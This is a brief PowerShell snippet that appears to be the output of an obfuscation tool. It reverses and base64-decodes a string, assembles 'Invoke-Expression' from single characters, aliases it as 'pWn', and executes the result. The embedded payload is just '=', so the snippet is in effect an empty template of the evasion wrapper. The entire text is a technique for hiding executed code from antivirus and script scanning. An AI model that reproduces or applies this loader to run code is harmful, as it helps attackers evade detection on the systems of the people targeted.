$v = "=" ;
$rY4wS3Ay2WbCfmUl04vKJ = $v.ToCharArray() ; [array]::Reverse($rY4wS3Ay2WbCfmUl04vKJ) ; -join $rY4wS3Ay2WbCfmUl04vKJ 2>&1> $null ;
$PSTLQ2VdxmBCuMhevf = [sySTEm.text.eNcOdIng]::uTf8.gETSTRing([SySTeM.ConvERT]::frOMBAse64STrinG("$rY4wS3Ay2WbCfmUl04vKJ")) ;
$qifdYNlkIRoFuEGbzXr3h = "I"+"N"+"v"+"O"+"k"+"e"+"-"+"e"+"x"+"P"+"r"+"E"+"S"+"s"+"i"+"o"+"n" ; NEw-aLIAS -naME pWn -VaLUE $qifdYNlkIRoFuEGbzXr3h -FORcE ; pWn $PSTLQ2VdxmBCuMhevf ;

